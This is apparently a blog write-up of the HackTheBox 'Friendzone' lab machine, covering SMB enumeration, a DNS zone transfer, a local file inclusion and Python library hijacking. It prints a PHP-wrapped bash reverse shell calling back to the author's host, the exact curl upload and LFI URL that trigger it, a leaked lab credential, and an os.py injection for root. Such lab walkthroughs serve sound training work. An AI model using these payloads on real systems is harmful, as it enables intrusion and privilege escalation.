BOX - Hackthebox - Friendzone

# ‘“Friendzone” Hackthebox write-up’:-

[![1*ufKqBTNPXR5_eMxKDUwg5w.jpeg](../_resources/7f7a17e9a633b483cc2367c227f087cc.jpg)](https://medium.com/@elliot.7497?source=post_page-----2cc2f8e0cd26----------------------)

[+X](https://medium.com/@elliot.7497?source=post_page-----2cc2f8e0cd26----------------------)

[Jun 2, 2019](https://medium.com/@elliot.7497/friendzone-hackthebox-write-up-2cc2f8e0cd26?source=post_page-----2cc2f8e0cd26----------------------) · 7 min read

[![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='25' height='25' viewBox='0 0 25 25' data-evernote-id='191' class='js-evernote-checked'%3e%3cpath d='M19 6a2 2 0 0 0-2-2H8a2 2 0 0 0-2 2v14.66h.01c.01.1.05.2.12.28a.5.5 0 0 0 .7.03l5.67-4.12 5.66 4.13a.5.5 0 0 0 .71-.03.5.5 0 0 0 .12-.29H19V6zm-6.84 9.97L7 19.64V6a1 1 0 0 1 1-1h9a1 1 0 0 1 1 1v13.64l-5.16-3.67a.49.49 0 0 0-.68 0z' fill-rule='evenodd' data-evernote-id='192' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40elliot.7497%2Ffriendzone-hackthebox-write-up-2cc2f8e0cd26&source=post_actions_header--------------------------bookmark_header-)

*This was a typical linux(openBSD)box which require quite a good amount of enumeration. Overall, this was quite an interesting box to do and it teaches you a lot about DNS, zone-transfer, and python library hijacking to obtain root on the box.The root part was pretty interesting and one get to know about infamous vulnerability in the way python language execute a script, which is further exploited to gain root over this box.*

![1*JLjHGw8FO2tiiPYMjiBdeQ.jpeg](../_resources/b3dfe0e6798542bf2ba8987c57413b87.jpg)
![1*JLjHGw8FO2tiiPYMjiBdeQ.jpeg](../_resources/2b55012550a6539591cb3cad19c148d0.jpg)
HTB logo.

# Basic enumeration:-

## Port scanning:

As usual we start with a full port nmap scan on the box.
![1*_OAfXkyA1pTnt0tt5brEAw.png](../_resources/8d6823204c7b236013138c2818b9b03d.png)
![1*_OAfXkyA1pTnt0tt5brEAw.png](../_resources/f0e9c44e649d58ba09ec3bc4efe64fa7.png)
nmap scan output

As it is clear from the scan results, that it has got SMB port open, so i will be connecting to this port and see what else is lying there. Executing the following command will list all the open SMB and their permissions.

***smbmap -H 10.10.10.123 -u root -p 445***
![1*tKctIfvzt8tME72h86851Q.png](../_resources/36c20f3041308beccd0a8863f42ddb1c.png)
![1*tKctIfvzt8tME72h86851Q.png](../_resources/fd5474b306d1879e02dfadf342e051d4.png)
smbmap output on port 445

So, the **Development share has read/write access and general has read-only access.** I will be connecting to general and then Development share to see if i could find anything interesting. Also in background I have executed a nmap script to enumerate the details of all shares on the SMB on port 445.

nmap --script smb-enum-users.nse -p139 10.10.10.123

The output of this command helped me to determine the path where the file be stored if I upload anything to the box via SMB using curl.

![1*LYLu-Tf6cJzjvHvFHNiXJQ.png](../_resources/9ec0e8f5725ce69a9ac3e269f6d7c1fe.png)
![1*LYLu-Tf6cJzjvHvFHNiXJQ.png](../_resources/502c71515f50054247bdc4eb30367071.png)
nmap smb-enum-shares output
*So whatever I upload to Development share will be stored in /etc/Development.*

## SMB file upload:

Now, I also have read access to Development and general share, so I will be connecting via smbclient to see if I could find anything interesting there.

> root@kali:~/HackTheBox/machines/friendzone# smbclient //10.10.10.123/general -u root

> Try “help” to get a list of possible commands.
> smb: \> ls
>  . D 0 Thu Jan 17 01:40:51 2019
>  .. D 0 Thu Jan 24 03:21:02 2019
>  creds.txt N 57 Wed Oct 10 05:22:42 2018
> get
>  9221460 blocks of size 1024. 6076468 blocks available
> smb: \> get creds.txt

> getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

> smb: \> ^C
**> root@kali:~/HackTheBox/machines/friendzone# cat creds.txt
> creds for the admin THING:**
**> admin:WORKWORKHhallelujah@#**
> root@kali:~/HackTheBox/machines/friendzone#

In general share I found a credential which says that these creds are for some ‘admin thing’ which looks like it is the login creds for administrator.

Now I need to find the login page to supply those creds. This box has DNS server running on it which can be verified by looking over the nmap scan results. But there are two different domains — **friendzone.red and friendzoneportal.red .**

I got to know about the **friendzoneportal.red** domain by visiting the port 80 in browser.

![1*df5_coXFpgJazPedLmpdAg.png](../_resources/459635fa49d4b728367780773474ad09.png)
![1*df5_coXFpgJazPedLmpdAg.png](../_resources/4d2d40b4dbe8e2fd0a3110ffbc8f2306.png)
port 80 output

## Zone transfer:

I will be doing a lookup over these two zones only to see if it leaks something important. If yes, then I will be doing **zone transfer** to acces those sub-domains. The command for the same is :

**dig axfr **[**<subdomain>@10**](http://twitter.com/10)**.10.10.123**
![1*69sFkTmV7v66_apTuBrGmw.png](../_resources/7f767a93a5c2d4e6ceee8946341f9696.png)
![1*69sFkTmV7v66_apTuBrGmw.png](../_resources/a83d332cc8cc02b5f9dc3b54b72b80c5.png)
zone transfer esults

* * *

*...*

## Getting user:

So I have got two admin domains, **admin.friendzoneportal.red and administrator1.friendzone.red**. Adding these two domains to /etc/hosts file and accessing them one by one and supplying the creds obtained earlier, I got to know that the initial domain is just a rabbit hole. It will as you for creds and after you input one, it says that page is not developed yet. Heading over to the later one, it seems legit.

![1*YrWvdkwWr7el8MXhP5dE5A.png](../_resources/ccda4500af42d619f12bbf50960757a3.png)
![1*YrWvdkwWr7el8MXhP5dE5A.png](../_resources/d5b737700bbce55ba1e60c423b9f40b5.png)
login page for admin
After logging in successfully, it shows a message to navigate to dashboard.php.
![1*XmKgAYC_uvcrcvO3uBB_sA.png](../_resources/3b1aea6a824672f0d399a964403fcd54.png)
![1*XmKgAYC_uvcrcvO3uBB_sA.png](../_resources/c9a7ef9367c05e4a314cd1688fb4648f.png)
dashboard.php

There it explains how to access an image after uploading it. The image can be uploaded from **uploads.friendzone.red **subdomain . But I chose SMB to upload files as I don’t know where that uploaded image will be saved. So I opted for SMB file upload method as I knew that it will be saved in **/etc/Development .**

The file which I chose to upload was a one-liner bash shell, executed via php.
> <?php
> exec(“/bin/bash -c ‘bash -i >& /dev/tcp/10.10.14.48/1234 0>&1’”);
> phpinfo();
> ?>
The file can be uploaded by using this command.

`curl --upload-file /path/to/file.ext -u 'DOMAIN\Username' smb://172.16.17.52/ShareName/`

In this the command resorts to:
`curl --upload-file phpinfo.php -u 'root' smb://10.10.10.123/Development/`

It can be confirmed that file is uploaded by connectig to the SMB on port 445. Also the curl asks for root password while uploading, which is , by default, blank. So just hit enter and it will upload the file.

![1*rzl5Hk1BNeXj0cm2pwsojQ.png](../_resources/17d4057abfa4b3646114856ac945dbd5.png)
![1*rzl5Hk1BNeXj0cm2pwsojQ.png](../_resources/cda1c266dfcc08e0ea3751e6fe8f6836.png)
uploding my php reverse shell

So, there are couple of other shells too. To get my shell, I will have to access that file , phpinfo.php in a web browser. While accessing dashboard.php, there was a hint on how to access the file.

> please enter it to show the image
> default is image_id=a.jpg&pagename=timestamp

Also it is a LFI(Local File Inclusion), so it can be accessed by navigating to the folder where it has been uploaded. Note that there is no need to append the extension ***.php ***in URL.

The file can be accessed by:

> [https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=/etc/Development/phpinfo

This will give us the callback of my php reverse shell.
![1*jUCfAtQxMvQBqxKmm37_bg.png](../_resources/f6930fabfe027560b0d2593e4e5aae54.png)
![1*jUCfAtQxMvQBqxKmm37_bg.png](../_resources/428e795d280933e47fbd0381f4f596ff.png)
reverse shell callback
The user hash can be obtained from reverse shell only.
![1*2jQgQR302uJ7-iIxYMfW9w.png](../_resources/bcc0d767358189f30d418cc93fc7d625.png)
![1*2jQgQR302uJ7-iIxYMfW9w.png](../_resources/b8b214f9b49b9e3c634c0a35053be346.png)
user hash

* * *

*...*

## Getting root:

Navigating through the directories of www-data in reverse shell, there is a mysql configuration file in **/var/www .**

![1*uJWBEOuIH0HZ2xRX_0Sa6A.png](../_resources/0497c698efbe0cc214e7ee35ad7c37f2.png)
![1*uJWBEOuIH0HZ2xRX_0Sa6A.png](../_resources/6db1e1f4edc097c1b944717781d7c140.png)
ssh credentials
So I can now ssh over the box and can have an actual tty shell.
![1*abFx_EjkDFthGUFeEEqt-Q.png](../_resources/928b2ec9c6ce0f1ed65df7377f856e93.png)
![1*abFx_EjkDFthGUFeEEqt-Q.png](../_resources/50ea0d55c8048c4ab3c698ba25e7ca17.png)
ssh user hash

I could have received the user hash via ssh also. However now I need to enumerate for processes and tasks running in the background. There is an excellent script for the same , pspy. It comes in both variant, 32-bit and 64-bit.

[ ## DominicBreuker/pspy   ### Monitor linux processes without root permissions. Contribute to DominicBreuker/pspy development by creating an account…    #### github.com](https://github.com/DominicBreuker/pspy)

One can also download the 64-bit binary so that compilation process is skipped.
https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64

I downloaded the binary and transferred it to the box via wget. Giving it the required permission to execute, (***chmod a+x pspy64***) and executing it(***./pspy64***), it started listing all the running and newly spwaned processes.

![1*JAxmiCNXqkmO2lSAyi2GKQ.png](../_resources/5c5dda8c9b51a4274c06fbf5d7d41970.png)
![1*JAxmiCNXqkmO2lSAyi2GKQ.png](../_resources/09828440f1c6fa6ae40aa2c9733fd67b.png)
pspy output

Cool. Now I need to kee a watch over the processes which are running or if any unusual task/process/script is spawned/executed. After a minute or two, a python script is executed by root which is a bit strange.

![1*Lf7v07SyAWXGnlZEcQPi_g.png](../_resources/42a239d83b9d59e4c3cc915c350164eb.png)
![1*Lf7v07SyAWXGnlZEcQPi_g.png](../_resources/c5883f5acda043c0fae00ba1f7579915.png)
reporter.py python file

heading over to the location where this file is saved( /opt/server_admin), and looking into the script, it appears that it is an incomplete file which doesn’t do anything other than importing a python library , OS module. So I can exploit this to get root.

## Python library hijacking:

> friend@FriendZone:/opt/server_admin$ cat reporter.py
> #!/usr/bin/python
**> import os**

> to_address = “> [> admin1@friendzone.com](https://medium.com/@elliot.7497/friendzone-hackthebox-write-up-2cc2f8e0cd26mailto:admin1@friendzone.com)> ”

> from_address = “> [> admin2@friendzone.com](https://medium.com/@elliot.7497/friendzone-hackthebox-write-up-2cc2f8e0cd26mailto:admin2@friendzone.com)> ”

> print “[+] Trying to send email to %s”%to_address

> #command = ‘’’ mailsend -to > [> admin2@friendzone.com](https://medium.com/@elliot.7497/friendzone-hackthebox-write-up-2cc2f8e0cd26mailto:admin2@friendzone.com)>  -from > [> admin1@friendzone.com](https://medium.com/@elliot.7497/friendzone-hackthebox-write-up-2cc2f8e0cd26mailto:admin1@friendzone.com)>  -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass “PAPAP”’’’

> #os.system(command)
> # I need to edit the script later
> # Sam ~ python developer

**Other than *import os* , every other command is commented out so the script doesn’t do anything effectively. I can hijack the OS module in python 2.7 (which is clear from the first line that it is executed using python 2.7) to execute the arbitrary code. I need to look for permission and the directories where os.py of python2.7 version is installed.**

[ ## Privilege Escalation via Python Library Hijacking | rastating.github.io   ### Whilst debugging a Python script today, I found that I was unable to execute it, with the stack trace pointing back to…    #### rastating.github.io](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

Locating and searching for the python 2.7 directory, I found it in /usr/lib/python2.7. The permission were 777.

**drwxrwxrwx 27 root root 16K Jun 2 20:21 python2.7**
The permission of os mudule was:
**rwxrwxr-x 1 friend friend 26K Jun 2 21:33 os.py**

It can be edited by the current user that is friend. All I need to do is to inject the code to copy the root.txt file to somewhere else such as /tmp directory and get the root shell.

I injected the following line in os.py file at the end.
**system(“cp /root/root.txt /tmp/root1.txt”)**

Now I have to wait for the cron job to execute reporter.py file and then the root hash will be copied in /tmp directory by the name of root1.txt.

After few minutes, the file is executed as before by the cron jobs and the root hash is copied in /tmp directory.

**rw-r — r — 1 root root 33 Jun 2 21:38 root1.txt**
**friend@FriendZone:/tmp$ wc -c root1.txt
33 root1.txt**

So this is it . We get the root hash. Also, FYI, the os.py module can be injected with other commands too to get root shell, but I found this method a bit straght forward.

The root part was really awesome.
If you find this write-up praise worthy, you can clap for me. I won’t mind.

# Till then, HACK THE PLANET !!!